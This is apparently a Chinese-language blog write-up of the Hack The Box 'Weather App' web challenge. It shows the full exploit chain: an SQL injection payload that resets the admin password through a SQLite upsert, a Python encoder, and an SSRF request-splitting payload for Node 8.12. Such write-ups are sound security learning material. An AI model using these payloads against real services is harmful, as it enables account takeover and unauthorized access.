
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title> [HTB] åˆä¸€é“writeup:Weather | æ”¶è·é¢‡å¤š | æŒå‰‘</title>
<meta name="description" content="ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ ">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://1dayluo.github.io">
        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
      </a>
      <a href="https://1dayluo.github.io">
        <h1 class="site-title">æŒå‰‘</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="menu purple-link">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="menu purple-link">
            å…³äº
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">
        <div class="post-detail">
          
          <h2 class="post-title"> [HTB] åˆä¸€é“writeup:Weather | æ”¶è·é¢‡å¤š</h2>
          <div class="post-info post-detail-info">
            <span><i class="icon-calendar-outline"></i> 2021-12-22</span>
            
              <span>
                <i class="icon-pricetags-outline"></i>
                
                  <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                    é¶åœº
                    
                      ï¼Œ
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                    åˆ·é¢˜
                    
                      ï¼Œ
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                    HTB
                    
                      ï¼Œ
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
                    web
                    
                  </a>
                
              </span>
            
          </div>
          <div class="post-content" v-pre>
            <h1 id="weather-app">Weather App</h1>
<p>è¿™é“é¢˜å€¼å¾—æ…¢æ…¢å•ƒ,å¦‚æœæœ‰ç¼˜çœ‹åˆ°æˆ‘è¿™ç¯‡writeupçš„è¯,å»ºè®®ä½ å®åœ¨å•ƒä¸ä¸‹å†çœ‹(æˆ–è€…åªçœ‹å¡ä½çš„åœ°æ–¹)</p>
<h2 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h2>
<p>ä¸ç®¡ç”¨burpæŠ“åŒ…,è¿˜æ˜¯åˆ†ææºä»£ç .å‡å¯ä»¥çœ‹åˆ°,å¤©æ°”çš„è·å–ä»¥POSTæ–¹å¼è¯·æ±‚äº†<code>/api/weather</code> æ¥å£(æºä»£ç è§<code>/static/js/main.js</code> )</p>
<p>çœ‹æºä»£ç è¿›è¡Œå®¡è®¡çš„æ—¶å€™,è¿˜å‘ç°äº†åœ¨<code>/static/host-unreachable.jpg</code> ä¸‹çš„ä¸€ä¸ªå›¾ç‰‡</p>
<!-- more -->
<script language = JavaScript> function password() {

Â  Â  var testV = 1;

Â  Â  var pass1 = prompt('please input the password','');

Â  Â  var passwordforthisarticle = "dhlove";

Â  Â  var inputtimemax = 5;

Â  Â  while (testV < inputtimemax) {

Â  Â  if (!pass1)

Â  Â  history.go(-1);

Â  Â  if (pass1 == passwordforthisarticle) {

Â  Â  break;

Â  Â  }

Â  Â  testV+=1;

Â  Â  var pass1 =

Â  Â  prompt('Password error!');

Â  Â  }

Â  Â  if (pass1!= passwordforthisarticle & testV == inputtimemax)Â Â 

Â  Â  history.go(-1);

Â  Â  return " ";

Â  Â  }

Â  Â  document.write(password());

</script>
<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled.png" alt="Untitled" loading="lazy"></figure>
<h3 id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</h3>
<p>è¿›è¡Œä»£ç çš„åˆ†æ,å‘ç°åªè¦ä»æ¥å£``/api/weather<code> </code> è¿”å›çš„å¤©æ°”æ¸©åº¦å­˜åœ¨,å°±ä¼šè¾“å‡ºå¯¹åº”çš„ç›¸åº”æ•°æ®</p>
<pre><code class="language-jsx">data = await res.json();

    if (data.temp) {
        weather.innerHTML = `
            &lt;div class='${data.icon}'&gt;&lt;/div&gt;
            &lt;h1&gt;City: ${city}&lt;/h1&gt;
            &lt;h1&gt;Temp: ${data.temp} C&lt;/h1&gt;
            &lt;h3&gt;Status: ${data.desc}&lt;/h3&gt;
        `;
    } else {
        weather.innerHTML = `
            &lt;h3&gt;${data.message}&lt;/h3&gt;
        `;
    }
</code></pre>
<p>æ‰å‘ç°,åŸæ¥è¿™ä¸ªlabéœ€è¦åœ¨é¢˜ç›®é¡µé¢ä¸‹è½½å¿…è¦çš„æ–‡ä»¶.ä½¿ç”¨dockerå»buildå¯¹åº”çš„image.ç„¶åå»åˆ†ææœ¬åœ°è¿è¡Œçš„ä»£ç ,äº†è§£è¿™ä¸ªapplicationæ˜¯å¦‚ä½•è¿ä½œçš„.</p>
<p>é¦–å…ˆå‘ç°æ˜¯node.jså†™çš„,ä»£ç é‡ä¸å¤§</p>
<p>çœ‹æ‰€æä¾›çš„æ–‡ä»¶,routesæ–‡ä»¶å¤¹ä¸‹çš„jsæ–‡ä»¶,å¤§æ¦‚äº†è§£äº†è·¯ç”±å’Œhtmlæ–‡ä»¶çš„å¯¹åº”å…³ç³»,é™¤äº†é¦–é¡µå¤–,è¿˜æœ‰/registerå’Œ/login.è€Œåœ¨/loginçš„èŠ‚ç‚¹ä¸‹,ä»¥ç®¡ç†å‘˜èº«ä»½ç™»é™†å°±ä¼šè¿”å›flag.ç›¸å…³çš„ä»£ç å¦‚ä¸‹</p>
<pre><code class="language-jsx">router.post('/login', (req, res) =&gt; {
	let { username, password } = req.body;

	if (username &amp;&amp; password) {
		return db.isAdmin(username, password)
			.then(admin =&gt; {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() =&gt; res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
</code></pre>
<p>è€Œè¿™é‡Œçš„dbå³database,å¯¹åº”çš„æ˜¯database.js .å…¶ä¸­idAdminçš„æ–¹æ³•å¦‚ä¸‹:(è¿™é‡Œä¸å¯sqlæ³¨å…¥)</p>
<pre><code class="language-jsx">async isAdmin(user, pass) {
        return new Promise(async (resolve, reject) =&gt; {
            try {
                let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
                let row = await smt.get(user, pass);
                resolve(row !== undefined ? row.username == 'admin' : false);
            } catch(e) {
                reject(e);
            }
        });
    }
</code></pre>
<p>å…¶ä¸­<code>this.db</code></p>
<pre><code class="language-python">async connect() {
        this.db = await sqlite.open(this.db_file);
    }
</code></pre>
<p>è€Œæ•°æ®åº“è¡¨ç»“æ„å¦‚ä¸‹,usernameæ˜¯ä¸å¯é‡å¤çš„,ä¸”é»˜è®¤ä¼šåˆ›å»ºä¸€ä¸ªadminç”¨æˆ·</p>
<pre><code class="language-jsx">return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
</code></pre>
<p>çœ‹èµ·æ¥å¥½åƒæš‚æ—¶æ²¡æœ‰ä»€ä¹ˆå¤´ç»ªäº†....ç„¶åçªç„¶æƒ³èµ·ä¸çŸ¥é“éœ€è¦ä¸‹è½½æ–‡ä»¶å‰çœ‹åˆ°çš„é‚£å¼ memeå›¾.å»æŸ¥çœ‹ä¸€ä¸‹ä½¿ç”¨apiç›¸å…³çš„ä»£ç å§!æŸ¥çœ‹./helpers/WeatherHelper.jsæ–‡ä»¶,å¯¹åº”çš„å°±æ˜¯å‰ç«¯çš„endpoint:/api/weather</p>
<p>åå°è¯·æ±‚çš„é“¾æ¥æ˜¯è¿™æ ·çš„</p>
<pre><code class="language-jsx">let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&amp;units=metric&amp;appid=${apiKey}`);
</code></pre>
<p>å…¶ä¸­HttpGetå¦‚ä¸‹(ä½äºhelpers/HttpHelper.js):</p>
<pre><code class="language-jsx">HttpGet(url) {
		return new Promise((resolve, reject) =&gt; {
			http.get(url, res =&gt; {
				let body = '';
				res.on('data', chunk =&gt; body += chunk);
				res.on('end', () =&gt; {
					try {
						resolve(JSON.parse(body));
					} catch(e) {
						resolve(false);
					}
				});
			}).on('error', reject);
		});
	}
</code></pre>
<p>å‘è¯¥urlè¯·æ±‚å,ä¼šåˆ¤æ–­<code>weatherData</code> (å³è¿”å›çš„responseçš„jsonæ•°æ®ä¸‹)æœ‰æ— nameå­—æ®µ,å¦‚æœæœ‰,åˆ™è¿›è¡Œè¿›ä¸€æ­¥å˜é‡èµ‹å€¼. è¿™é‡Œä¸å¤ªä¼šäº†,æŒ‰ç…§æˆ‘çš„ç†è§£,å…³é”®åœ¨äºåˆ©ç”¨apiæ¥ä¼ªé€ adminé˜…è¯»æœ‰flagçš„endpoint.æ‰“ç®—åœ¨æœ¬åœ°å…ˆæµ‹è¯•ä¸€ä¸‹....</p>
<p>ç„¶åæˆ‘åˆè¿”å›å»é˜…è¯»äº†ä¸€ä¸‹isAdminçš„ä»£ç ,å‘ç°åªè¦æ³¨å†ŒæˆåŠŸ,å°±å¯ä»¥ç”¨è¿™ä¸ªç”¨æˆ·åç™»é™†.ç„¶åè¢«è¯†åˆ«ä¸ºadmin.</p>
<pre><code class="language-jsx">resolve(row !== undefined ? row.username == 'admin' : false);
</code></pre>
<p>ç„¶åæˆ‘ç¬¬ä¸€æ¬¡è®¤çœŸçš„çœ‹äº†registerç›¸å…³çš„ä»£ç (  çœ‹è¿‡ä»£ç ,æ‰å‘ç°ä¸ºä»€ä¹ˆä¹‹å‰æµ‹è¯•è¿™ä¸ªendpoint çš„æ—¶å€™,æ¯æ¬¡ç‚¹å‡»æ³¨å†Œ,éƒ½ä¼šè¿”å›401. <code>req.socket.remoteAddress.replace(/^.*:/, '')</code> æ˜¯è¿‡æ»¤,ä¼šæŠŠå†’å·å‰çš„è¿‡æ»¤æ‰,åŒ…æ‹¬å†’å·æœ¬èº«.</p>
<p>è¿™é‡Œçš„remoteAddressåŒ…æ‹¬ipv4å’Œipv6çš„åœ°å€,æ›´å¤šç›¸å…³å¯ä»¥çœ‹stackoverflowä¸Šçš„é—®ç­”:</p>
<p><a href="https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs">https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs</a></p>
<pre><code class="language-jsx">router.post('/register', (req, res) =&gt; {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username &amp;&amp; password) {
		return db.register(username, password)
			.then(()  =&gt; res.send(response('Successfully registered')))
			.catch(() =&gt; res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});
</code></pre>
<p>å†çœ‹ä¸€ä¸‹æ³¨å†Œç›¸å…³çš„sqlä»£ç ,æ˜¯æ²¡æœ‰ä½¿ç”¨å ä½ç¬¦(?)æ¥é˜²æ­¢sqlæ³¨å…¥çš„.çœ‹èµ·æ¥è¦ç”¨ssrfå®ç°æ³¨å†Œ, å¹¶ä¸”è¦åˆ©ç”¨åˆ°sqlæ³¨å…¥,ç»•è¿‡è¯¥ifåˆ¤æ–­.ç„¶åè¿›è¡Œç™»é™†,æ‹¿åˆ°flag, å®éªŒä¸€ä¸‹è‡ªå·±çš„çŒœæƒ³,æŠŠæ³¨å†Œå¤„çš„åˆ¤æ–­æ³¨é‡Šæ‰,ç„¶åå®éªŒsqlæ³¨å…¥èƒ½å¦åœ¨è¯¥endpointä¸Šæ‹¿åˆ°adminçš„å¯†ç </p>
<h2 id="å–æ¶ˆ401æ³¨é‡Šæ„é€ sqlæ³¨å…¥">å–æ¶ˆ401æ³¨é‡Š,æ„é€ SQLæ³¨å…¥</h2>
<p>çœ‹ä»£ç çŸ¥é“,åªæœ‰/registerå¤„èƒ½å¤Ÿæ³¨å…¥,</p>
<p>registerå¤„çš„sqlæ“ä½œçš„ä»£ç </p>
<pre><code class="language-jsx">async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) =&gt; {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }
</code></pre>
<p>(åœ¨æ²¡æœ‰æºç çš„åŸºç¡€ä¸Š,å…¶å®é¦–å…ˆæ˜¯è¦æµ‹è¯•åŸå§‹sqlæ•°æ®åº“ç±»å‹,ä»¥åŠè¯­å¥çš„é—­åˆæ–¹å¼/å‚æ•°ä¸ªæ•°,è¿™é‡Œçš„é—­åˆæ–¹å¼ä¸º<code>');--</code> )</p>
<p>è¿™é‡Œä¸èƒ½ç”¨ADNå’ŒOR,å› ä¸ºè¿™ä¸¤ä¸ªè¿ç®—ç¬¦éƒ½ç”¨äº: ç»“åˆä¸€ä¸ª SQL è¯­å¥çš„ WHERE å­å¥ä¸­çš„å¤šä¸ªæ¡ä»¶ã€‚</p>
<p>ä¸€å¼€å§‹æˆ‘å¯¹payloadçš„çŒœæƒ³æ˜¯è¿™æ ·çš„:</p>
<pre><code class="language-jsx">username=abc4&amp;password=1234');+UPDATE+users+SET+password='1234'+WHERE+username='admin';--
</code></pre>
<p>æ‹¼æ¥èµ·æ¥,åœ¨nodejsçš„registerå‡½æ•°ä¸‹,queryå¯¹åº”çš„å€¼ä¾¿æ˜¯:</p>
<p><code>INSERT INTO users (username, password) VALUES ('abc', '1234'); UPDATE users SET password='1234' WHERE username='admin';--')</code></p>
<p>ä½†æ˜¯åœ¨ä¸‹æ–‡çš„â€éªŒè¯:â€ä¸€èŠ‚ä¸­,å´å‘ç°è¯¥payloadæ— æ³•ä½¿ç”¨.åˆæ­¥å®éªŒå,å‘ç°nodejsæ­¤å¤„è°ƒç”¨çš„queryåªæ‰§è¡Œç¬¬ä¸€å¥sql(â€;â€å‰çš„),æœ¬ä»¥ä¸ºè¿™æ ·è¡Œçš„é€š,æ²¡æƒ³åˆ°è¿™é‡Œçš„payloadè¦é‡æ–°æ„é€ ,ç„¶åå¯¹â€insert intoâ€è¯­å¥å¦‚ä½•å¿½ç•¥uniqueçº¦æŸè¿›è¡Œäº†æŸ¥è¯¢,sqliteå®˜æ–¹æœ‰æè¿°:<a href="https://sqlite.org/lang_conflict.html">https://sqlite.org/lang_conflict.html</a></p>
<p>ç”¨æ³•æè¿°è§:<a href="https://www.sqlite.org/lang_UPSERT.html">https://www.sqlite.org/lang_UPSERT.html</a></p>
<p>æ ¹æ®æ–‡æ¡£æè¿°,åœ¨æœ¬åœ°å»ºäº†ä¸€ä¸ªsqliteæ•°æ®åº“è¿›è¡Œæµ‹è¯•,ä»¥ä¸‹è¯­å¥æœ€ç»ˆå¯ä»¥æµ‹è¯•é€šè¿‡:</p>
<pre><code class="language-python">insert into users(username,password) values('admin','admin') on conflict(username) do update set password = '1234' where username='admin'
</code></pre>
<p>æ‰€ä»¥payloadå°±æ˜¯:</p>
<pre><code class="language-python">username=admin&amp;password=1234')%20on%20conflict(username)%20do%20update%20set%20password%20%3d%20'1234'%20where%20username%3d'admin';--
</code></pre>
<h2 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h2>
<p>å¥½è€¶,è¦ç”¨åˆ°nodejsçš„æ¼æ´!å…¶å®æˆ‘å¡è¿™é‡Œäº†,çœ‹äº†åˆ«äººçš„æ–‡ç« æ‰çŸ¥é“....qwqè™½ç„¶æ–‡ä¸­æåˆ°å…ˆçŸ¥ç¤¾åŒºçš„æ–‡ç« å¾ˆå¥½,ä½†æ˜¯æˆ‘æ‰“ç®—å…ˆé è‡ªå·±çš„åŠ›é‡:æœç´¢æ‰¾åˆ°å¯¹åº”çš„nodejs v8çš„ç›¸å…³å®‰å…¨æ–‡ç« (å¾—è®­ç»ƒè‡ªå·±è¿™æ–¹é¢çš„èƒ½åŠ›)</p>
<p>åœ¨ä¸Šä¸€æ­¥çš„sqlæ³¨å…¥æµ‹è¯•ä¸­,ä¸ºäº†åªé’ˆå¯¹sql,æ‰€ä»¥å¯¹å¦‚ä¸‹ä»£ç åŠ äº†æ³¨é‡Š.åœ¨è¿™ä¸€æ­¥ä¸­,è¦é€šè¿‡nodejsçš„æ¼æ´æ¥ç»•è¿‡è¯¥åˆ¤æ–­</p>
<pre><code class="language-jsx">
	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}
</code></pre>
<h3 id="æŸ¥æ‰¾æ¼æ´ç›¸å…³å†…å®¹">æŸ¥æ‰¾æ¼æ´ç›¸å…³å†…å®¹</h3>
<p>çœ‹Dockerfileå‘ç°nodeçš„ç‰ˆæœ¬æ˜¯node:8.12.0-alpine,</p>
<p>nodejsçš„æ›´æ–°æ—¥è®°:<a href="https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V8.md#8.12.0">https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V8.md#8.12.0</a></p>
<p>åœ¨issuesä¸‹ä»¥sucurityå’Œsemver-majorçš„æ ‡ç­¾ä¹Ÿèƒ½å¤Ÿæ‰¾åˆ°:<a href="https://github.com/nodejs/node/pull/16237">https://github.com/nodejs/node/pull/16237</a> å¯ä»¥çœ‹å¾—åˆ°åˆ©ç”¨è¿™ä¸ªå®‰å…¨é—®é¢˜å¯ä»¥å®ç°è¯·æ±‚èµ°ç§,åœ¨issuesä¸‹è¿˜å¼•ç”¨äº†ä¸€ç¯‡ç»å…¸çš„orangeçš„SSRFçš„æŠ¥å‘Š(å¦‚å›¾) æ˜¯å…³äºåœ¨SSRFä¸­å®ç°èµ°ç§,pptåœ¨nodejsç›¸å…³çš„é¡µæ•°ä¸­å†™åˆ°,åƒU+FF2Eå³<strong>å…¨å®½</strong>æ‹‰ä¸å¤§å†™å­—æ¯â€ï¼®â€çš„unicodeç¼–ç ,åœ¨è¿›è¡Œhttpåè®®çš„urlå¤„ç†æ—¶,ä¸èƒ½å®Œæ•´åœ°å¤„ç†å®ƒçš„ç¼–ç ,å¯¼è‡´ï¼®ï¼®/è¢«è½¬ä¹‰ä¸º<code>../</code></p>
<figure data-type="image" tabindex="2"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_1.png" alt="Untitled_1" loading="lazy"></figure>
<p>è¯¦ç»†çš„è§£é‡Šè§:<a href="https://github.com/nodejs/node/issues/13296#issuecomment-305162413">https://github.com/nodejs/node/issues/13296#issuecomment-305162413</a></p>
<h3 id="å°è¯•ç†è§£äº§ç”ŸåŸå› ">å°è¯•ç†è§£äº§ç”ŸåŸå› </h3>
<p>è¿™ä¸ªbugæ˜¯åœ¨httpè¯·æ±‚ä¸­é‡åˆ°non-Latin-1å­—ç¬¦æ—¶æ‰ä¼šå‡ºç°çš„,è€Œé’ˆå¯¹httpç±»çš„è¯·æ±‚,nodejså¯¹äºheaderå¤„ç†æ—¶æ˜¯ç»Ÿä¸€æŒ‰ç…§latin-1ç¼–ç è¿›è¡Œå¤„ç†,è€Œä¸æ˜¯UTF-8.ç„¶åæˆ‘æ ¹æ®æˆ‘çš„ç†è§£,æŒ‰ç…§å…³é”®è¯â€nodejs latin1 injectionâ€è¿›è¡Œgoogle,å°±æœåˆ°äº†å…ˆçŸ¥ç¤¾åŒºå¼•ç”¨çš„é‚£ç¯‡è‹±æ–‡åŸæ–‡çš„æŠ¥å‘Šwww</p>
<blockquote>
<p>Node.js defaults to using &quot;latin1&quot;, a single-byte encoding that cannot represent high-numbered unicode characters such as the ğŸ¶ emoji</p>
</blockquote>
<p>è¿™æ ·ç†è§£çš„è¯,è¿™ä¸ªæ¼æ´å°±æ˜¯åˆ©ç”¨nodejsé»˜è®¤é‡‡ç”¨latin-1ç¼–ç åœ¨httpåè®®ä¸Š,å¯¼è‡´å®½å­—èŠ‚çš„æ•°æ®åœ¨ä¼ è¾“ä¸­ç¼ºæŸ,åŠå®‰å…¨æ„ä¹‰ä¸Šçš„â€æ•°æ®ä¸å®Œæ•´â€.</p>
<p>æ ¹æ®githubçš„issuesä»¥åŠæœåˆ°çš„æ–‡ç« é˜…è¯»åç†è§£,latin-1åœ¨å¤„ç†unicodeä¸‹çš„å®½å­—èŠ‚ç¼–ç æ—¶,åªä¿ç•™ç‰¹å®šä½æ•°,è€Œå‰©ä½™ç ä½ä¸Šçš„æ•°å­—ä¼šè¢«å¿½ç•¥,ä¸¾ä¾‹æ¥è¯´,å°±æ˜¯:</p>
<p><code>\uff2e</code> ä¼šå˜æˆ <code>0x2e</code></p>
<p>ç”¨åœ¨çº¿unicodeç¼–ç æµ‹è¯•ä¸€ä¸‹:<a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a> å°±å‘ç°çŒœæƒ³æ­£ç¡®äº†.</p>
<p>è€Œå› ä¸ºnodejsåœ¨å¤„ç†latin-1ç¼–ç çš„æ—¶å€™,<code>\u010D\u010A/</code> åœ¨latin-1ä¸‹å¹¶éæ§åˆ¶å­—ç¬¦,æ‰€ä»¥ç»•è¿‡äº†nodejså†…éƒ¨çš„é˜²å¾¡.</p>
<h3 id="æ„é€ å¯¹åº”ssrf">æ„é€ å¯¹åº”SSRF</h3>
<p>åŒæ ·çš„,æˆ‘ä¼šå…ˆåœ¨çº¿ä¸‹çš„dockerç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•</p>
<p>ç©ºæ ¼çš„unicodeç¼–ç ä¸º:<code>\u0020</code> è½¬ä¸ºlatin-1:<code>\u0120</code></p>
<p>è¿™é‡Œå†™ä¸ªpythonè„šæœ¬è¿›è¡Œè½¬æ¢å¥½äº†....çªç„¶è§‰å¾—æ‰‹åŠ¨æœ‰ç‚¹éº»çƒ¦</p>
<p>å¦‚ä¸‹:</p>
<pre><code class="language-python">import re
from pprint import pprint

def decode(my_str):
    &quot;&quot;&quot;å°†åŒ…å«å®½å­—èŠ‚çš„å­—ç¬¦ä¸²ä»¥latin-1ç¼–ç æ–¹å¼è¿›è¡Œè§£ç (å¤ç°nodejs v8å­—èŠ‚ä¸¢å¤±)&quot;&quot;&quot;
    rules = re.compile(r'\\u[0-9A-Za-z]{2}')
    rules_2 = re.compile('\\u0020')
    after = rules.sub(r'\\u00', my_str).encode('utf-8').decode('unicode_escape')
    after = rules_2.sub(r' ',after)
    print(after) 
    # pprint(after) #å¦‚æœç”¨pprint,å¯ä»¥è¾“å‡ºæ§åˆ¶ç¬¦
    return after

def encode(my_str):
    &quot;&quot;&quot;å°†æ™®é€šç¼–ç çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºèƒ½ç”¨äºæ„é€ payloadçš„latin-1ç¼–ç &quot;&quot;&quot;
    rules = re.compile(r'\\n')
    rules_2 = re.compile(r' ')
    my_str = my_str.encode('unicode_escape').decode('utf-8')
    unicode_str = rules.sub(r'\\u010D\\u010A', my_str)
    after = rules_2.sub(r'\\u0120', unicode_str)
    print(after)
</code></pre>
<h3 id="éªŒè¯">éªŒè¯:</h3>
<p>æˆ‘ç›´æ¥ç°åœºæŠ˜è…¾nodejsç„¶åå†™äº†ä¸€æ®µnodejsåœ¨åŸå§‹ä»£ç ä¸Š....ğŸ˜­(å› ä¸ºsqliteè¿è¡Œåœ¨dockerå†…éƒ¨,è€Œdockerè¿è¡ŒçŠ¶æ€ä¸­,ä½¿ç”¨attachè¿›å…¥åå¿…é¡»å¾—ä¸­æ–­å½“å‰è¿è¡Œçš„nodejsä»£ç ....ç›´æ¥åœ¨dockerå®¹å™¨å¤–è¿›è¡Œsqlite3è¿æ¥æ˜¯ä¸è¡Œçš„,ä¸è¿‡....å¦‚æœæœ‰å¤§ä½¬èƒ½å‘Šè¯‰æˆ‘åˆ«çš„æ–¹æ³•ä¸‡åˆ†æ„Ÿè°¢,è¿™é‡Œæˆ‘ç ”ç©¶äº†å¥½ä¹…)</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_2.png" alt="Untitled" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_3.png" alt="Untitled" loading="lazy"></figure>
<p>éªŒè¯æ­¥éª¤å¦‚ä¸‹:</p>
<ul>
<li>ä»£ç å¤„401å¤„æ³¨é‡Šä¸‹,é¦–å…ˆéªŒè¯sqlæ³¨å…¥</li>
<li>å–æ¶ˆæ³¨é‡Š,åœ¨apiæ¥å£å¤„,ç»“åˆ/registerä¸‹çš„è¯·æ±‚,éªŒè¯ssrf(åˆ©ç”¨æ¼æ´,èµ°ç§,æºå¸¦ç¬¬ä¸€æ­¥ä¸­çš„sqlæ³¨å…¥çš„è¯·æ±‚)</li>
</ul>
<p>åœ¨ç¬¬äºŒæ­¥éªŒè¯çš„æ—¶å€™è¦æƒ³åŠæ³•æ„é€ åˆé€‚çš„å†…å®¹è·³è¿‡ifçš„åˆ¤æ–­,å…¶å®å°±æ˜¯æ— è®ºæ˜¯ipv4è¿˜æ˜¯ipv6ä¸‹,ç”¨æˆ·(å³å®¢æˆ·ç«¯)è®¿é—®çš„ipå‡è¦ä¿è¯ä¸º127.0.0.1</p>
<p>è¿˜æœ‰è¿™ä¸€æ­¥Content-Lengthå¾ˆé‡è¦,å¦‚æœè®¡ç®—ä¸å¯¹ç›´æ¥å½±å“req.socket.remoteAddressä¸ºundefined(è¡€æ³ªæ•™è®­,å¡äº†æˆ‘ä¸€å¤©åŠTUT) å¦‚æœä¸ä¼šç”¨è®¡ç®—Content-Lengthçš„è¯,å¯ä»¥å…ˆæŠŠå®ƒè®¾ç½®ä¸ºå¤§ä¸€ç‚¹çš„å€¼,æœåŠ¡å™¨å¯¹åº”ä¼šæ˜¾ç¤ºâ€request abortedâ€,ç„¶ååœ¨è¿™ä¸ªä¸´ç•ŒåŸºç¡€ä¸Šå¾€ä¸‹å‡å°±å¯ä»¥</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_4.png" alt="Untitled" loading="lazy"></figure>
<h3 id="æœ€åçš„payload">æœ€åçš„payload</h3>
<p>å“­äº†,åšäº†ä¸€å‘¨ ç»ˆäºå•ƒå‡ºæ¥äº†</p>
<pre><code class="language-python">127.0.0.1/test\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1:80\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:80\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120120\u010D\u010A\u010D\u010Ausername=admin&amp;password=1234')+on+conflict(username)+do+update+set+password='1234'+where+username='admin';--\u010D\u010A\u010D\u010AGET\u0120/123
</code></pre>
<h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<ul>
<li><a href="https://blog.le31ei.top/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/">https://blog.le31ei.top/2021/05/23/nodejsè¯·æ±‚èµ°ç§ä¸ssrf/</a>   (æ„Ÿè°¢è€å“¥æ–‡ç« ,ä¸ç„¶çœŸçš„ä¸çŸ¥é“è¦ç”¨åˆ°nodejsæ¼æ´)</li>
<li><a href="https://github.com/nodejs/node/issues/13296#issuecomment-305162413">https://github.com/nodejs/node/issues/13296#issuecomment-305162413</a></li>
<li><a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a></li>
<li><a href="https://sqlite.org/forum/info/a0693a9e8ad39120">https://sqlite.org/forum/info/a0693a9e8ad39120</a></li>
</ul>

          </div>
        </div>

        
          <div class="next-post">
            <a class="purple-link" href="https://1dayluo.github.io/post/htbphonebook-or-writeup/">
              <h3 class="post-title">
                ä¸‹ä¸€ç¯‡ï¼š[HTB]phonebook | writeup
              </h3>
            </a>
          </div>
          
      </div>

      

      <div class="site-footer">
